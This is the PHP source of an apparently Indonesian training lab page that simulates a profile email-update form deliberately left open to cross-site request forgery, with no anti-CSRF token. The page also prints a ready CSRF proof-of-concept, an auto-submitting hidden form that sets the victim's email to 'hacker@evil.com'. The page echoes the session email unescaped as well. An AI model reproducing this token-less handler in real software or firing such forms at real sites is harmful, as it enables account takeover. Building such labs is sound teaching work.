<?php
session_start();
include '../../config/db.php';
include '../../core/auth.php';

// Simulasi Data User di Database
if (!isset($_SESSION['user_email'])) {
    $_SESSION['user_email'] = "rahmat@adr-group.com";
}

$message = "";

// --- TITIK KERENTANAN (CSRF) ---
// Aplikasi memproses perubahan data sensitif hanya berdasarkan SESSION 
// tanpa ada pengecekan TOKEN unik untuk setiap request.
if (isset($_POST['update_email'])) {
    $new_email = $_POST['email'];
    $_SESSION['user_email'] = $new_email;
    $message = "Sukses! Email berhasil diperbarui menjadi: <strong>" . htmlspecialchars($new_email) . "</strong>";
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Lab | mrahmatt74 Security</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../../public/assets/csrf.css">
</head>
<body>

<div class="container">
    <div class="header">
        <h2><i class="fas fa-user-shield"></i> CSRF Lab</h2>
        <a href="../../index.php" class="btn-back"><i class="fas fa-arrow-left"></i> Dashboard</a>
    </div>

    <div class="card">
        <p>Gunakan modul ini untuk mensimulasikan fitur pembaruan profil yang rentan terhadap serangan CSRF.</p>

        <div class="profile-section">
            <div class="profile-info">
                <i class="fas fa-envelope"></i> Email Saat Ini: <strong><?= $_SESSION['user_email'] ?></strong>
            </div>

            <?php if ($message): ?>
                <div class="success-msg" style="background:#e8f5e9; color:#2e7d32; padding:15px; border-radius:8px; margin:15px 0; border:1px solid #c8e6c9;">
                    <?= $message ?>
                </div>
            <?php endif; ?>

            <form method="POST" class="update-form" style="margin-top:20px;">
                <label style="display:block; margin-bottom:8px; font-weight:600;">Ganti Email Baru:</label>
                <div style="display:flex; gap:10px;">
                    <input type="email" name="email" placeholder="emailbaru@adr.com" required 
                           style="flex:1; padding:12px; border:1px solid #ddd; border-radius:8px;">
                    <button type="submit" name="update_email" 
                            style="background:#285A48; color:white; border:none; padding:10px 20px; border-radius:8px; cursor:pointer;">
                        Update
                    </button>
                </div>
            </form>
        </div>

        <div class="payload-hint">
            <strong>Lab Objective:</strong><br>
            Buatlah sebuah file HTML di komputer Anda (local) yang memaksa browser untuk mengirimkan request ke halaman ini secara otomatis:
            <pre style="background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 8px; margin-top: 10px; font-size: 0.8rem; overflow-x: auto;">
&lt;!-- CSRF PoC Exploit --&gt;
&lt;form id="exploitForm" action="https://mrahmatt74.com/modules/client_side/csrf_lab.php" method="POST"&gt;
    &lt;input type="hidden" name="email" value="hacker@evil.com" /&gt;
    &lt;input type="hidden" name="update_email" value="1" /&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('exploitForm').submit();&lt;/script&gt;</pre>
            <p style="margin-top:10px; font-style:italic; font-size:0.85rem;">
                *Pastikan Anda dalam keadaan login di Lab mrahmatt74 sebelum membuka file exploit tersebut.
            </p>
        </div>
    </div>
</div>

</body>
</html>